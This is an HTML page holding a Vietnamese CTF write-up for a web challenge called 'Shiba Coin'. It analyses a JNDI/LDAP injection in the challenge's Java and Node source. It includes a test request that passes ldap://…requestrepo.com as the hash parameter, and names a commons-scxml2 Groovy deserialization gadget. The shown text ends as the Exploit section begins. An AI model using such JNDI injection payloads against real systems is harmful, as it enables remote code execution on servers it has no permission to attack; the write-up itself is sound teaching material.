@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="taneora,web,security,ctf,writeups">
+    
+    <meta name="author" content="Taneora">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://dungnhvhust.github.io/2025/05/16/shiba-coin/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/taneora.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/taneora.jpg">
+    <meta name="theme-color" content="#9af5f0">
+    <link rel="shortcut icon" href="/images/taneora.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Shiba Coin | Taneora&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Josefin+Sans&display=swap" rel="stylesheet">
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"dungnhvhust.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["pentester"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#9af5f0","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":true,"family":"Josefin Sans","url":"https://fonts.googleapis.com/css2?family=Josefin+Sans&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":"Taneora's blog"},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/taneora.jpg","description":"I'm Taneora, Offensive Security Expert (Gonna be - Wanna be)?!.","title":"Taneora's blog"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/malta_light.png","dark":"/images/malta_dark.png"},"title":"Hi, I'm Taneora.","subtitle":{"text":null,"hitokoto":{"enable":false,"show_author":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"0rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null,"facebook":"https://www.facebook.com/dung.nhv/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":10},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"LS":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/dungnhvhust","Blog":"https://dungnhvhust.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"menu","announcement":"Welcome to my blog site.","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/9/12 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+        
+<link rel="stylesheet" href="/fontawesome/duotone.min.css">
+
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Taneora&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    LS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/dungnhvhust">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://dungnhvhust.github.io">
+                                                    BLOG
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                LS
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/dungnhvhust">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="https://dungnhvhust.github.io">BLOG</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/archives"
+                        >
+                            <span>Archives</span>
+                            <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">16</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Shiba Coin</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/taneora.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Taneora</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">pentester</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-05-16</span>
+        <span class="mobile">2025-05-16</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-02-04 03:35:48</span>
+            <span class="mobile">2026-02-04 03:35:48</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/BKSEC-Challenge/">BKSEC-Challenge</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/BKSEC/">BKSEC</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Blockchain/">Blockchain</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="ShibaCoin-web"><a href="#ShibaCoin-web" class="headerlink" title="ShibaCoin - web"></a>ShibaCoin - web</h1><blockquote>
+<p>Tên : ShibaCoin<br>Có source code.</p>
+</blockquote>
+<h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h2><h3 id="Phan-tich-source-code"><a href="#Phan-tich-source-code" class="headerlink" title="Phân tích source code:"></a>Phân tích source code:</h3><p>Phát hiện web có dùng JNDI Service với LDAP và <code>com.sun.jndi.ldap.object.trustSerialData</code> đã được bật lại,điều này cho phép LDAP có khả năng load được class động.<br><a href="/images/shiba-coin_01.png">image</a></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(JndiService.class);</span><br><span class="line">    <span class="keyword">private</span> Context context;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JndiService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            context = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            logger.info(<span class="string">&quot;JNDI service initialized successfully with in-memory and LDAP support&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Failed to initialize JNDI context&quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Failed to initialize JNDI context&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String path)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (context == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;JNDI context is not initialized&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        logger.info(<span class="string">&quot;Looking up JNDI resource at path: &#123;&#125;&quot;</span>, path);</span><br><span class="line">        <span class="keyword">return</span> context.lookup(path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String path, Object obj)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (context == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;JNDI context is not initialized&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        logger.info(<span class="string">&quot;Binding object to JNDI resource at path: &#123;&#125;&quot;</span>, path);</span><br><span class="line">        context.bind(path, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShibaCoinApiApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustSerialData&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        SpringApplication.run(ShibaCoinApiApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Phân tích mã nguồn, ta xác định được nguồn dữ liệu đầu vào (source) là hàm bất đồng bộ  <code>getTransaction(transactionHash)</code> : </p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getTransaction</span>(<span class="params">transactionHash</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">`<span class="subst">$&#123;API_URL&#125;</span>/api/transaction?hash=<span class="subst">$&#123;transactionHash&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> response.<span class="property">data</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error retrieving transaction:&#x27;</span>, error.<span class="property">response</span>?.<span class="property">data</span> || error.<span class="property">message</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Failed to retrieve transaction details&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/get-transaction&#x27;</span>, ensureAuthenticated, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> transactionHash = req.<span class="property">query</span>.<span class="property">hash</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> transaction = <span class="keyword">await</span> transactionAPI.<span class="title function_">getTransaction</span>(transactionHash);</span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;transaction-details&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;Transaction Details - ShibaCoin&#x27;</span>,</span><br><span class="line">            <span class="attr">user</span>: req.<span class="property">session</span>.<span class="property">user</span>,</span><br><span class="line">            transaction,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        req.<span class="title function_">flash</span>(<span class="string">&#x27;error_msg&#x27;</span>, <span class="string">&#x27;Failed to load transaction details&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/dashboard/transactions&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>Test thử với <code>requestrepo</code> : <code>http://localhost:3000/dashboard/get-transaction?hash=ldap://qaixu8zf.requestrepo.com</code> ta thấy có DNS<br><a href="/images/shiba-coin_02.png">image</a></p>
+<p>Giờ việc cần làm là tìm gadget để khai thác.<br>Kiểm tra file <code>pom.xml</code> ta chỉ thấy có 3 dependency được dùng là :</p>
+<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-scxml2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>Đến đây là tắc,<code>ysoserial</code> không có,buộc phải mò tay,sau gần 1 tháng không tìm được gadget,khầy Nam nhả cái <a class="link"   target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2024/blob/main/web/lookup/solution/README.md" >writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ra thì có gadget của scxml2 ( <a class="link"   target="_blank" rel="noopener" href="https://github.com/apache/commons-scxml/blob/88ca43e2c46161c529af28adcb1de5775f9a56ae/src/main/java/org/apache/commons/scxml2/env/groovy/GroovyExtendableScriptCache.java#L305" >Link<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ) với sink <code>groovy.lang.GroovyClassLoader.parseClass()</code></p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Tiếp theo có thể tạo gadget payload rồi dựng LDAP server bằng <code>marshalsec</code> trả về object serialized hoặc dùng luôn code exploit có sẵn : </p>
